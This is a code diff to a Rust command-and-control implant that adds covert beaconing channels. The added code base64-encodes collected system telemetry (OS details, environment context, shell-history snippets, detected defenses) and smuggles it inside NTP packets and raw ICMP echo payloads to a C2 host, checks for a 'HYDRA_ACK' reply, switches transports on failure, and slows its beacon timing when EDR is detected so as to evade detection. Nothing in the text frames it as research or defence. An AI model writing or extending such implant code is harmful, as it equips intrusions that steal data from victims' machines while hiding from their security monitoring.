@@ -7,11 +7,11 @@ use serde::{Serialize, Deserialize};
 use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
 use base64::{Engine as _, engine::general_purpose};
 // Added for system recon
-use sysinfo::{System, User}; 
-
 // Cleaned up imports (Removed unused pnet::packet::Packet and pnet::util)
+use sysinfo::System; // 
 use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
-use pnet::packet::icmp::IcmpTypes;
+use pnet::packet::icmp::IcmpTypes; 
+use pnet::packet::Packet;
 
 #[derive(Serialize, Clone)]
 struct Telemetry {
@@ -146,17 +146,28 @@ struct NtpTransport {
 
 impl Transport for NtpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
-        println!("[!] C2-NTP: Synchronizing state via {}...", self.pool_addr);
+        let target = "127.0.0.1:123"; 
         let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
-        let mut ntp_packet = [0u8; 48];
+        socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
+        
+        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
+        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
+        
+        let mut ntp_packet = vec![0u8; 48];
         ntp_packet[0] = 0x1B; 
-        let status_code: u32 = if stats.status == "OK" { 0xDEADC0DE } else { 0xBADC0DED };
-        let bytes = status_code.to_be_bytes();
-        ntp_packet[44..48].copy_from_slice(&bytes);
-        let _ = socket.send_to(&ntp_packet, &self.pool_addr);
-        println!("[*] NTP Signal Dispatched (Covert Payload: 0x{:X})", status_code);
-        Err("NTP signal sent blindly".into())
+        ntp_packet.extend_from_slice(encoded.as_bytes());
+
+        // Send
+        socket.send_to(&ntp_packet, target).map_err(|e| e.to_string())?;
+
+        // Wait for ACK
+        let mut buf = [0u8; 100];
+        match socket.recv_from(&mut buf) {
+            Ok(_) => Ok(C2Response { status: "ntp_ack".into(), task: "SLEEP".into(), epoch: 0 }),
+            Err(_) => Err("NTP Timeout: Orchestrator offline".into()),
+        }
     }
+
     fn get_name(&self) -> String { "NTP-Signaling".into() }
 }
 
@@ -168,15 +179,42 @@ struct IcmpTransport {
 
 impl Transport for IcmpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
-        println!("[!] C2-ICMP: Encapsulating telemetry for {}...", self.target_ip);
-        let payload = serde_json::to_vec(stats).map_err(|e| e.to_string())?;
-        let mut buffer = vec![0u8; 8 + payload.len()]; 
+        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
+        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
+        
+        // 1. Build & Send (Short & Fast)
+        let mut buffer = vec![0u8; 8 + encoded.len()];
         let mut packet = MutableEchoRequestPacket::new(&mut buffer).unwrap();
         packet.set_icmp_type(IcmpTypes::EchoRequest);
-        packet.set_payload(&payload);
-        println!("[*] ICMP Raw Packet Ready: {} bytes", buffer.len());
-        Err("ICMP packet dispatched blindly".into())
+        packet.set_payload(encoded.as_bytes());
+        
+        let (mut tx, mut rx) = pnet::transport::transport_channel(
+            4096,
+            pnet::transport::TransportChannelType::Layer4(pnet::transport::TransportProtocol::Ipv4(pnet::packet::ip::IpNextHeaderProtocols::Icmp))
+        ).map_err(|e| e.to_string())?;
+
+        tx.send_to(packet, std::net::IpAddr::V4(self.target_ip)).map_err(|e| e.to_string())?;
+
+        // 2. Strict One-Shot Receive
+        let mut rx_iter = pnet::transport::icmp_packet_iter(&mut rx);
+        
+        // If we don't get exactly what we want in 1 second, we EXIT the function.
+        match rx_iter.next_with_timeout(Duration::from_millis(1000)) {
+            Ok(Some((packet, addr))) if addr == std::net::IpAddr::V4(self.target_ip) => {
+                let rx_payload = packet.payload();
+                if rx_payload.len() >= 13 && &rx_payload[4..13] == b"HYDRA_ACK" {
+                    return Ok(C2Response { status: "icmp_ack_verified".into(), task: "SLEEP".into(), epoch: 0 });
+                }
+                println!("[-] Signature mismatch! Likely Kernel Ping.");
+                Err("SIG_FAIL".into())
+            },
+            _ => {
+                println!("[-] No valid C2 response detected.");
+                Err("OFFLINE".into())
+            }
+        }
     }
+
     fn get_name(&self) -> String { "ICMP-Failsafe".into() }
 }
 
@@ -327,7 +365,7 @@ impl Agent {
                 os: os_info.clone(),
                 env_context: env_ctx.clone(),
                 artifact_preview: history_snippet,
-                defense_profile: defense_ctx, // Critical: Integrated Phase 2.3
+                defense_profile: defense_ctx, 
             };
 
             match self.transport.send_heartbeat(&stats) {
@@ -338,18 +376,38 @@ impl Agent {
                 Err(e) => {
                     println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                     self.failures += 1;
+
+                    // TACTICAL ESCALATION: If ICMP fails, or we hit 3 fails, mutate NOW.
+                    if self.transport.get_name() == "ICMP-Failsafe" || self.failures >= 3 {
+                        self.mutate();
+                        continue; // This breaks the sleep and moves to the next transport immediately.
+                    }
                 }
             }
 
             if self.failures >= 3 { self.mutate(); }
             
+            // --- PHASE 2.4: ADAPTIVE JITTER & TEMPORAL EVASION ---
             let mut rng = rand::thread_rng();
-            let exp = Exp::new(self.lambda).unwrap();
-            let sleep_time = exp.sample(&mut rng).min(60.0).max(1.0);
+            let mut current_lambda = self.lambda;
+
+            // TACTICAL ADJUSTMENT: If EDR is present, throttle the heartbeat.
+            // Lower Lambda = higher inter-arrival time (IAT).
+            if stats.defense_profile != "None" {
+                current_lambda /= 2.0; 
+                println!("[!] EDR Detected: Throttling traffic to avoid heuristic detection.");
+            }
+
+            let exp = Exp::new(current_lambda).unwrap();
+            
+            // Adaptive Clamping: Allow longer sleeps (up to 5 mins) when under surveillance
+            let max_sleep = if stats.defense_profile != "None" { 300.0 } else { 60.0 };
+            let sleep_time = exp.sample(&mut rng).min(max_sleep).max(1.0);
+            
             thread::sleep(Duration::from_secs_f64(sleep_time));
         }
     }
-    
+
     fn mutate(&mut self) {
         self.state = (self.state + 1) % 6;
         self.failures = 0;
